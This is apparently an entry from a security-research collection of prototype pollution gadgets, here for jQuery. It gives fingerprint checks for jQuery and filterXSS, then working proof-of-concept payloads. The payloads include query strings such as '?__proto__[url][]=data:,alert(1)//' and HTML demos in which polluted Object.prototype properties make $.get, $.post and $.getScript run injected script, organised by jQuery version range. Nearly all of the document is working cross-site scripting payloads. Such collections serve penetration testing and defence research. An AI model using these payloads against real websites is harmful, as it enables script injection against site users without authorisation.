## jQuery 

URL: https://jquery.com/

### JS Fingerprint
```
return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && $.fn.jquery !== 'undefined')
```

### JS Fingerprint
```
return (filterXSS !== 'undefined')
```

### PoC
#### $.get jQuery >= 3.0.0
```
?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
```

```html
<script src=https://code.jquery.com/jquery-3.5.1.js></script>
<script> 
  Object.prototype.url = ['data:,alert(1)//'];   
  Object.prototype.dataType = 'script';
</script>      
<script>
  $.get('https://google.com/'); 
  $.post('https://google.com/'); 
</script>
```

#### $.getScript jQuery >= 3.4.0
```
?__proto__[src][]=data:,alert(1)//
```

```html
<script src=https://code.jquery.com/jquery-3.5.1.js></script>
<script>
  Object.prototype.src = ['data:,alert(1)//']
</script>
<script>
  $.getScript('https://google.com/')
</script>
```

#### $.getScript jQuery 3.0.0 - 3.3.1

```
?__proto__[url]=data:,alert(1)//
```

```html
<script/src=https://code.jquery.com/jquery-3.3.1.js></script>
<script>
  Object.prototype.url = 'data:,alert(1)//'
</script>
<script>
  $.getScript('https://google.com/')
</script>
```
